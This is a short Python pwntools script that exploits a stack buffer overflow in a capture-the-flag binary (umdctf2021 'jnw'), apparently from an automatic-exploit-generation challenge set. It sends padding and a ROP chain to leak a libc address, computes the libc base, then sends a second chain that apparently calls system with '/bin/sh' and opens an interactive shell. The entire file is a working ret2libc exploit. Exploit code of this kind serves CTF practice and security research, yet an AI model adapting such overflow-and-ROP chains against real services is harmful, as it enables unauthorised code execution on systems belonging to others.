from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/22_umdctf2021_jnw/umdctf2021_jnw")
pwn.gdb.attach(p)
p.recvuntil(b'Welcome to the space shuttle! Get ready for an adventure!\nWhere do you want to go?\n')
payload = b"\x00" * 72
payload += p64(0x40101a) + p64(0x4012c3) + p64(0x403ff0) + p64(0x401070) + p64(0x4012c3) + p64(0x404880) + p64(0x4010a0) + p64(0x40117d) + p64(0x404878) + p64(0x401209)
payload += b"\n"
p.send(payload)
libc_base = u64(p.recv()[0:6].ljust(8,b'\x00')) + -0x21ba0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p64(0x4012c3) + p64(libc_base + 0x1b3d88) + p64(libc_base + 0x4f420)
payload += b"\n"
p.send(payload)
p.interactive()
